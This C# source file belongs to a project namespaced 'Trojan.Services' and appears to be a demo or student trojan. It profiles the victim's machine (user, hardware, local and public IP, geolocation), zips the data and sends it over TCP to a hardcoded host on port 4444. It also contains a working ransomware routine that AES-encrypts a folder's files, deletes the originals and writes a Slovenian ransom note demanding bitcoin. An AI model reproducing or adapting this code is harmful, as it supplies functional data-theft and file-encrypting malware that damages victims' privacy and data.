using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Windows;
using Microsoft.Win32;
using System.Security.Cryptography;

namespace Trojan.Services
{
    public static class DeviceScannerService
    {
        private static readonly byte[] EncryptionKey = GenerateKeyFromPassword("demo123");
        private static readonly byte[] EncryptionIV = new byte[16];

        private static byte[] GenerateKeyFromPassword(string password)
        {
            // Pretvori lozinku u 256-bitni ključ (32 bajta)
            using (SHA256 sha256 = SHA256.Create())
            {
                return sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
            }
        }
        public static async Task SaveDeviceInfo()
        {
            StringBuilder sb = new();
            sb.AppendLine("=== DEVICE INFO ===");
            sb.AppendLine();
            sb.AppendLine($"User: {Environment.UserName}");
            sb.AppendLine($"PC Name: {Environment.MachineName}");
            sb.AppendLine($"OS: {RuntimeInformation.OSDescription}");
            sb.AppendLine($"64 Bit OS: {Environment.Is64BitOperatingSystem}");
            sb.AppendLine($"CPU: {GetCPU()}");
            sb.AppendLine($"GPU: {GetGPU()}");
            sb.AppendLine($"RAM: {GetRAM()} GB");
            sb.AppendLine($"Dark Mode: {IsDarkMode()}");
            sb.AppendLine($"Local IP: {GetLocalIP()}");
            await AddPublicIPInfo(sb);

            // Folder path
            string folder =
                Path.Combine(
                    Environment.GetFolderPath(
                        Environment.SpecialFolder.ApplicationData),
                    "gnezdece");

            // Create folder
            Directory.CreateDirectory(folder);

            // File path
            string file =
                Path.Combine(folder, "device_info.txt");

            // Save file
            await File.WriteAllTextAsync(file, sb.ToString());
            await SendFolderToServer("192.168.214.130", 4444);

        }
        public static async Task SendFolderToServer(string serverIp, int port)
        {
            string folderPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "gnezdece");

            if (!Directory.Exists(folderPath))
            {
                Console.WriteLine("Folder ne postoji!");
                return;
            }

            // Kreiraj privremeni folder samo za fajlove koji nisu zaključani
            string tempFolder = Path.Combine(Path.GetTempPath(), "gnezdece_temp_" + Guid.NewGuid().ToString());
            Directory.CreateDirectory(tempFolder);

            // Kopiraj samo device_info.txt (bazu preskoči)
            string sourceFile = Path.Combine(folderPath, "device_info.txt");
            string destFile = Path.Combine(tempFolder, "device_info.txt");

            if (File.Exists(sourceFile))
            {
                File.Copy(sourceFile, destFile, true);
                Console.WriteLine("Kopiran device_info.txt");
            }

            // Zip-uj samo temp folder
            string zipPath = Path.GetTempFileName() + ".zip";
            ZipFile.CreateFromDirectory(tempFolder, zipPath);
            Console.WriteLine("Zip kreiran (bez baze)");

            // Pošalji zip
            byte[] zipData = await File.ReadAllBytesAsync(zipPath);

            try
            {
                using TcpClient client = new TcpClient();

                // DODAJ TIMEOUT - 5 sekundi za konekciju
                var connectTask = client.ConnectAsync(serverIp, port);
                if (await Task.WhenAny(connectTask, Task.Delay(5000)) != connectTask)
                {
                    Console.WriteLine("Server nije dostupan (timeout). Nastavljam dalje...");
                    return;
                }

                using NetworkStream stream = client.GetStream();

                // DODAJ TIMEOUT za slanje (5 sekundi)
                var sendTask = stream.WriteAsync(zipData, 0, zipData.Length);
                if (await Task.WhenAny(sendTask, Task.Delay(5000)) != sendTask)
                {
                    Console.WriteLine("Slanje nije uspelo (timeout). Nastavljam dalje...");
                    return;
                }

                await stream.FlushAsync();
                Console.WriteLine("Folder poslat kao zip");
            }
            catch (SocketException ex)
            {
                Console.WriteLine($"Server nije dostupan: {ex.Message}. Nastavljam dalje...");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Greška pri slanju: {ex.Message}. Nastavljam dalje...");
            }
            finally
            {
                // Obriši temp fajlove
                if (File.Exists(zipPath))
                    File.Delete(zipPath);
                if (Directory.Exists(tempFolder))
                    Directory.Delete(tempFolder, true);
            }
        }


        // ============================================================
        // IMITACIJA RANSOMWARE-A (najlakši način - bez servera)
        // ============================================================

        /// <summary>
        /// Zaključa folder "POMEMBNI PODATKI!!!!" - preimenuje fajlove i stvara ransom note
        /// </summary>
        public static void LockFolder()
        {
            string folderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "POMEMBNI PODATKI!!!!");

            if (!Directory.Exists(folderPath))
            {
                Console.WriteLine($"[ERROR] Folder ne postoji: {folderPath}");
                return;
            }

            Console.WriteLine("[INFO] Pokrećem ENKRIPCIJU fajlova...");

            // Obriši stari ransom note
            string ransomNote = Path.Combine(folderPath, "README_LOCKED.txt");
            if (File.Exists(ransomNote))
                File.Delete(ransomNote);

            byte[] iv = new byte[16];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(iv);
            }
            // Šifruj SVE fajlove u folderu
            foreach (string file in Directory.GetFiles(folderPath))
            {
                string fileName = Path.GetFileName(file);

                // Preskoči ako je već enkriptovan
                if (fileName.EndsWith(".encrypted"))
                    continue;

                EncryptFile(file);
                Console.WriteLine($"  Enkriptovan: {fileName} → {fileName}.encrypted");
            }

            // Napravi ransom note
            string noteContent = @"
============================================================
              VAŠE DATOTEKE SO ENKRIPTOVANE!
============================================================

Vse vaše datoteke so šifrirane s pomočjo AES-256 enkripcije.

BREZ GESLA NI MOGOČE DOBITI VSEBINO!

Za dešifriranje datotek, vnesite pravilno geslo.

Geslo vam pošljemo ko na donirate 1000BTC na naš crypto wallet:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

============================================================
";
            File.WriteAllText(ransomNote, noteContent);
            Console.WriteLine($"  Kreiran: README_LOCKED.txt");

            Console.WriteLine("\n[SUCCESS] Svi fajlovi su enkriptovani!");
            Console.WriteLine($"  Lokacija: {folderPath}");
        }

        public static void UnlockFolder(string password)
        {
            // Provera lozinke
            if (password != "demo123")
            {
                Console.WriteLine("[ERROR] Pogrešna lozinka!");
                MessageBox.Show("Pogrešna lozinka! Pokušajte ponovo.", "Greška", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            string folderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "POMEMBNI PODATKI!!!!");

            if (!Directory.Exists(folderPath))
            {
                Console.WriteLine($"[ERROR] Folder ne postoji: {folderPath}");
                MessageBox.Show($"Folder ne postoji: {folderPath}", "Greška", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            Console.WriteLine("[INFO] Pokrećem DEKRIPCIJU fajlova...");

            // Obriši ransom note
            string ransomNote = Path.Combine(folderPath, "README_LOCKED.txt");
            if (File.Exists(ransomNote))
            {
                File.Delete(ransomNote);
                Console.WriteLine("  Obrisan: README_LOCKED.txt");
            }

            // Dešifruj sve .encrypted fajlove
            bool anyDecrypted = false;
            foreach (string file in Directory.GetFiles(folderPath))
            {
                if (file.EndsWith(".encrypted"))
                {
                    string originalFile = file.Substring(0, file.Length - 10); // skini .encrypted
                    DecryptFile(file, originalFile);
                    Console.WriteLine($"  Dešifrovan: {Path.GetFileName(file)} → {Path.GetFileName(originalFile)}");
                    anyDecrypted = true;
                }
            }

            if (!anyDecrypted)
            {
                Console.WriteLine("[INFO] Nema enkriptovanih fajlova.");
                MessageBox.Show("Nema enkriptovanih fajlova!", "Info", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            else
            {
                Console.WriteLine("\n[SUCCESS] Svi fajlovi su dešifrovani!");
                MessageBox.Show("Fajlovi su uspešno dešifrovani!", "Uspeh", MessageBoxButton.OK, MessageBoxImage.Information);
            }
        }

        private static void EncryptFile(string filePath)
        {
            try
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = GenerateKeyFromPassword("demo123");
                    aes.GenerateIV(); // Generiše random IV
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (var encryptor = aes.CreateEncryptor())
                    {
                        byte[] encryptedBytes = encryptor.TransformFinalBlock(fileBytes, 0, fileBytes.Length);

                        // Sačuvaj IV + enkriptovane bajtove
                        byte[] result = new byte[aes.IV.Length + encryptedBytes.Length];
                        Array.Copy(aes.IV, 0, result, 0, aes.IV.Length);
                        Array.Copy(encryptedBytes, 0, result, aes.IV.Length, encryptedBytes.Length);

                        string encryptedPath = filePath + ".encrypted";
                        File.WriteAllBytes(encryptedPath, result);
                        File.Delete(filePath);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Greška: {ex.Message}");
            }
        }

        private static void DecryptFile(string encryptedPath, string outputPath)
        {
            try
            {
                byte[] encryptedData = File.ReadAllBytes(encryptedPath);

                // Izvuci IV (prvih 16 bajtova)
                byte[] iv = new byte[16];
                byte[] cipherText = new byte[encryptedData.Length - 16];
                Array.Copy(encryptedData, 0, iv, 0, 16);
                Array.Copy(encryptedData, 16, cipherText, 0, cipherText.Length);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = GenerateKeyFromPassword("demo123");
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (var decryptor = aes.CreateDecryptor())
                    {
                        byte[] decryptedBytes = decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
                        File.WriteAllBytes(outputPath, decryptedBytes);
                        File.Delete(encryptedPath);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Greška: {ex.Message}");
            }
        }
        static string GetCPU()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "select Name from Win32_Processor");

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"]?.ToString();
            }

            return "Unknown";
        }

        static string GetGPU()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "select Name from Win32_VideoController");

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"]?.ToString();
            }

            return "Unknown";
        }

        static double GetRAM()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");

            foreach (ManagementObject obj in searcher.Get())
            {
                double ram =
                    Convert.ToDouble(obj["TotalPhysicalMemory"]);

                return Math.Round(ram / 1024 / 1024 / 1024, 2);
            }

            return 0;
        }

        static bool IsDarkMode()
        {
            try
            {
                using RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize");

                object value =
                    key?.GetValue("AppsUseLightTheme");

                if (value != null)
                {
                    return (int)value == 0;
                }
            }
            catch { }

            return false;
        }

        static string GetLocalIP()
        {
            foreach (NetworkInterface ni in
                     NetworkInterface.GetAllNetworkInterfaces())
            {
                var props = ni.GetIPProperties();

                foreach (var ua in props.UnicastAddresses)
                {
                    if (ua.Address.AddressFamily ==
                        System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ua.Address.ToString();
                    }
                }
            }

            return "Unknown";
        }

        static async Task AddPublicIPInfo(StringBuilder sb)
        {
            try
            {
                using HttpClient client = new();

                string json =
                    await client.GetStringAsync(
                        "https://ipinfo.io/json");

                using JsonDocument doc =
                    JsonDocument.Parse(json);

                var root = doc.RootElement;

                sb.AppendLine(
                    $"Public IP: {root.GetProperty("ip")}");

                sb.AppendLine(
                    $"City: {root.GetProperty("city")}");

                sb.AppendLine(
                    $"Region: {root.GetProperty("region")}");

                sb.AppendLine(
                    $"Country: {root.GetProperty("country")}");
            }
            catch
            {
                sb.AppendLine(
                    "Failed to fetch public IP.");
            }
        }
    }
}